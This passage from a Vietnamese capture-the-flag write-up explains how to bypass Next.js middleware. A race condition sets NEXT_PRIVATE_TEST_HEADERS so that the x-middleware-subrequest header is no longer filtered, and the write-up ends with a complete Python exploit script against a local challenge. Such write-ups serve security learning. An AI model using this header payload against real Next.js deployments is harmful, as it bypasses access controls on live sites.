// not be honored from the external request
const INTERNAL_HEADERS = [
  'x-middleware-rewrite',
  'x-middleware-redirect',
  'x-middleware-set-cookie',
  'x-middleware-skip',
  'x-middleware-override-headers',
  'x-middleware-next',
  'x-now-route-matches',
  'x-matched-path',
]

export const filterInternalHeaders = (
  headers: Record<string, undefined | string | string[]>
) => {
  for (const header in headers) {
    if (INTERNAL_HEADERS.includes(header)) {
      delete headers[header]
    }

    // If this request didn't origin from this session we filter
    // out the "x-middleware-subrequest" header so we don't skip
    // middleware incorrectly
    if (
      header === 'x-middleware-subrequest' &&
      headers['x-middleware-subrequest-id'] !==
        (globalThis as any)[Symbol.for('@next/middleware-subrequest-id')]
    ) {
      delete headers['x-middleware-subrequest']
    }
  }
}

```

Như ta đã thấy cve này vá thêm 1 header khác đó là `x-middleware-subrequest`
Vậy làm sao để bypass qua ta có `NEXT_PRIVATE_TEST_HEADERS` (Tắt chức năng filter header dành cho các anh dev)
auke để hệ thống lại cho dễ hiểu

1. Muốn lấy được flag phải qua được middleware -> dùng header đã có payload exploit sẵn
2. để set được header -> qua được hàm filterInternalHeaders -> ta có `NEXT_PRIVATE_TEST_HEADERS`
3. Nhưng làm sao để set được `NEXT_PRIVATE_TEST_HEADERS` -> race condition

![image](https://hackmd.io/_uploads/B1PssOsxex.png)

in ra con ngựa là thành công
![image](https://hackmd.io/_uploads/SJZTo_oxge.png)

```python=
import asyncio
import httpx

CHALL_URL = "http://localhost:8003"

async def start_next(client):
    r = await client.post(f"{CHALL_URL}/start")
    r.raise_for_status()
    return r.text

async def set_env(client, env: str):
    r = await client.post(f"{CHALL_URL}/csrf", data={"token": env})
    if r.status_code == 500:
        # it's fine, env var was set anyway
        pass
    return r.text

async def get_flag(client):
    headers = {
        #"x-nextjs-data": "1",
        "x-middleware-subrequest": "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" #
    }
    r = await client.get(f"{CHALL_URL}/admin/flag", headers=headers)
    return (r.status_code, r.text)

async def main():  # thiết lập ham main
    async with httpx.AsyncClient(timeout=None) as client: # thiết lập client
        starter = asyncio.create_task(start_next(client)) # tạo task
        await asyncio.sleep(1) # mini race to set env var
        print(await set_env(client, "NEXT_PRIVATE_TEST_HEADERS")) # set env var
        print(await starter)
        await asyncio.sleep(1) # wait for the nextjs app to start
        _, html = await get_flag(client)
        if "fake{" in html:
            print("🐴🐴🐴🐴")
            #print(html)

if __name__ == "__main__":
    asyncio.run(main())

```
